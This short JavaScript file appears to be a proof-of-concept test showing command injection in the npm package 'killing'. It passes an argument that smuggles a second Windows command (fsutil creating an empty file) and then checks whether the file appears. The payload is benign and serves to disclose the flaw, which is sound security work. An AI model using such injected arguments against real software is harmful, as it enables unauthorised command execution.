// test("Command Injection in killing", (done) => {
  const killing = require("killing");
  const fs = require("fs");
  const path = "./killing";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  //killing("test & fsutil file createnew killing 0 & exit 1");
  killing(`"test" & fsutil file createnew killing 0 &`);
  setTimeout(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, () => {
//       done();
    });
  }, 500);
// });
